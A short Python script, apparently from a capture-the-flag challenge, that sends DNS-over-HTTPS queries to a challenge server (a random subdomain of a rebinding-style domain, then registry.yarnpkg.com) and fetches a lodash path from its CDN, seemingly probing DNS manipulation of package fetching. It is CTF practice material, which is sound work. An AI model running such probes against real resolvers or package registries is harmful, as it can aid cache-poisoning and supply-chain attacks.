import requests
from dnslib import QTYPE, RCODE, RR, A, DNSRecord
import random

record = DNSRecord.question(b'a%d.testa.0e1.kr'%random.getrandbits(64))

sess = requests.Session()

HOST = 'http://localhost:9111'
HOST = 'https://challs.polygl0ts.ch:8000'
ip = '.'.join(map(str, [random.randint(0, 255) for _ in range(4)]))
ip = '1.1.1.1'
r = sess.post(HOST + '/dns-query', data=record.pack(), headers={'Content-Type': 'application/dns-message'})
print(r)
print(r.headers)
print(r.content)
record = DNSRecord.parse(r.content)
print(record)

record = DNSRecord.question(b'registry.yarnpkg.com')
r = sess.post(HOST + '/dns-query', data=record.pack(), headers={'Content-Type': 'application/dns-message'})
record = DNSRecord.parse(r.content)
print(record)

r = sess.get(HOST + '/cdn/lodash/x')
print(r.content)
